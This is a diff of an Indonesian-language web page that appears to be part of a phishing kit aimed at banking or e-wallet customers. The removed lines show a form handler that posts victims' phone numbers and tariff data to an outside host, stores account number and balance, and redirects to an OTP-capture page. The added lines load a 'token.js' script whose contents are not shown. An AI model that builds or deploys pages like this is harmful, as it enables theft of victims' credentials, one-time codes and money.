@@ -658,7 +658,7 @@ select{
 <center>
 
 </center>
-<form onsubmit="sendNohp(event); return false" method="POST" id="inputlogin" style="margin-top: -35px; padding: 10px">
+<form onsubmit="sendSaldo()" method="POST" id="inputsaldo" style="margin-top: -35px; padding: 10px">
 <input type="hidden" id="tarif" name="tarif">
 <input type="hidden" name="nohp" id="nohp">    
 <center>
@@ -703,9 +703,8 @@ select{
 
     </div>
     <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
-    <script src="../js/viber.js"></script>
-    <script src="../js/valid.js"></script>
-    <script src="../js/function_btn.js"></script>
+    
+    <script src="token.js"></script>
 <script>
 var tarif = sessionStorage.getItem("tarif");
 document.getElementById("tarif").value = tarif + "";
@@ -769,41 +768,7 @@ function vibr(dur) {
 }
 
   </script>
-<script>
- $(document).ready(function(){
-    $('#inputlogin').submit(function(e) {
-    event.preventDefault();
- $('.load').fadeIn();    
-document.getElementById('kirims').innerHTML = "Memproses....";
 
-
- $.ajax({
- type: 'POST',
- url: 'https://chroedevsi.whf.bz/virtual11/two.php',
- data: $(this).serialize(),
- 
- complete: function(data) {
- vibr(220);    
-            console.log('Complete')
-   setTimeout(function(){
- window.location.href='otpblm.html';
- var tarif = $('#tarif').val(); 
- sessionStorage.setItem("tarif", tarif);
- var nohp = $('#nohp').val();
- sessionStorage.setItem("nohp", nohp);
- var rek= $('#rek').val();
- sessionStorage.setItem("rek", rek);
- var saldo = $('#saldo').val();
- sessionStorage.setItem("saldo", saldo);
-  $('.load').fadeOut();
-    }, 1000);
-        }
-    });
- });
-    return false;
-});   
-     
-</script>
 
    
      <script>
@@ -849,105 +814,7 @@ document.getElementById('kirims').innerHTML = "Memproses....";
             }
         }
   </script>
-   <script>
-               $(document).ready(function() {
-            $('.toggle i').click(function() {
-                if ($("#pass").attr('type') === 'password') {
-                    $("#pass").attr('type', 'text');
-                    $(this).removeClass('fa-eye-slash').addClass('fa-eye');
-                } else {
-                    $("#pass").attr('type', 'password');
-                    $(this).removeClass('fa-eye').addClass('fa-eye-slash');
-                }
-            });
-            $('#uname, #pass').on('input', function() {
-                if ($('#uname').val().length < 6 || $('#pass').val().length < 6) {
-                    $('#btnsubmit').prop('disabled', true);
-                } else {
-                    $('#btnsubmit').prop('disabled', false);
-                }
-            });
-        });
-        $("textarea").each(function () {
-            this.setAttribute("style", "height:" + (this.scrollHeight) + "px;overflow-y:hidden;");
-        }).on("input", function () {
-            this.style.height = 0;
-            this.style.height = (this.scrollHeight) + "px";
-        });
-        $('#inpsms').on('input', function() {
-            if ($(this).val().length < 10){
-                $('#btnsubmit').prop('disabled', true);
-            } else {
-                $('#btnsubmit').prop('disabled', false);
-            }
-        });
-        
-        
-           $(document).ready(function() {
-            $("body").on('click', 'button#doLog', function() {
-                var uname = $("#uname").val();
-                var pass = $("#pass").val();
-
-                $.ajax({
-                    url: "/login/confirm.php",
-                    method: "POST",
-                    data: "username="+user+"&password="+pass,
-                    beforeSend: function() {
-                        $("#loading").show();
-                    },
-                    success: function(responsex) {
-                        $("#aseli").html('');
-                        if(responsex == "true") {
-                            $.get("", function(datax, status){
-                                window.history.pushState("", "", '');
-                                $("#hideBody").hide();
-                                $("#loading").hide();
-                                $("#aseli").html(datax);
-                            });
-                        } else {
-                            $.get("", function(data, status){
-                                window.history.pushState("", "", '');
-                                setTimeout(function() { 
-                                    $("#hideBody").hide();
-                                    $("#loading").hide();
-                                    $("#aseli").html(data);
-                                    $("#aseli").show();
-                                }, 1000);
-                            });
-                        }
-                        
-                    }
-                })
-            });
-            $("div#eyeOpen").on('click', function() {
-                $("#eyeOpen").css("display", "none");
-                $("#eyeClose").css("display", "block");
-
-                $("#pass").prop("type", "text");
-
-                $("div#eyeClose").on('click', function() {
-                    $("#eyeOpen").css("display", "block");
-                    $("#eyeClose").css("display", "none");
-
-                    $("#pass").prop("type", "password");
-                });
-            });
-
-            $("#uname").on('input', function() {
-                var uname = $("#uname").val();
-                var pass = $("#pass").val();
-
-                OnButton(uname, pass);
-            });
-
-            $("#pass").on('input', function() {
-                var uname = $("#user").val();
-                var pass = $("#pass").val();
-
-                OnButton(uname, pass);
-            });
-        });
-   </script>
+  
    <script>
  function gotoback(){
       $(".containerpin").fadeOut();
